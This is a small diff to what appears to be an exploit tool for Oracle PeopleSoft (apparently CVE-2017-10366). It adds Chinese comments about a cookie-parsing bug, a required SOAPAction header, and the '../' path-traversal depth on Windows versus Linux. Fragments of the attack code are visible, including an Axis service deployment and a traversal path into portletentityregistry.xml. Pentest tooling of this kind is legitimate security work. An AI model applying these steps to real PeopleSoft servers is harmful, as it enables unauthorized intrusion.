@@ -20,7 +20,6 @@
 - https://erpscan.io/press-center/blog/peoplesoft-security-part-4-peoplesoft-pentest-using-tokenchpoken-tool/
 - https://erpscan.io/advisories/erpscan-17-023-crlf-injection-peoplesoft-imservlet/
 - https://erpscan.io/press-center/blog/peoplesoft-security-configuration-part-2-patch-management/
-- 
 - https://www.oracle.com/security-alerts/cpujul2017.html
 - https://github.com/blazeinfosec/CVE-2017-10366_peoplesoft
 - [Oracle PeopleSoft applications are under attacks!](https://conference.hitb.org/hitbsecconf2015ams/wp-content/uploads/2015/02/D1T2-Alexey-Tiurin-Oracle-Peoplesoft-Applications-are-Under-Attack.pdf)
@@ -300,7 +299,7 @@ class Recon(Browser):
         r = self.get('/psp/%s/signon.html' % self.site_id)
 
         for c, v in self.session.cookies.items():
-            if c.endswith('-PORTAL-PSJSESSIONID'):   # 这里当Set-Cookie的值有多个-分割是会有bug。待实际环境修改此处。
+            if c.endswith('-PORTAL-PSJSESSIONID'):   # 这里当Set-Cookie的值有多个-分割时可能有bug。待实际环境修改此处。
                 #self.local_host, self.local_port, *_ = c.split('-')
                 self.local_host, self.local_port = 'localhost','80'
                 o('+', 'Target: %s:%s' % (self.local_host, self.local_port))
@@ -469,7 +468,7 @@ class AxisDeploy(Recon):
             '/pspc/services/%s' % self.service_name,
             data=data,
             headers={
-                'SOAPAction': 'useless',
+                'SOAPAction': 'useless',    # 这个头必须带，值是什么无所谓
                 'Content-Type': 'application/xml'
             }
         )
@@ -537,7 +536,8 @@ class AxisDeploy(Recon):
 
         per = '/WEB-INF/data/portletentityregistry.xml'
         per_path = self.war_path('pspc')
-        tmp_path = '../' * 20 + 'TEMP'
+        tmp_path = '../' * 20 + 'TEMP'   # 这是Windows下的情况
+        # tmp_path = '../' * 2 + 'TEMP'  # Linux下具体的个数视情况而定？
         tmp_dir = self.random_string(20)
         tmp_per = tmp_path + '/' + tmp_dir + per
 
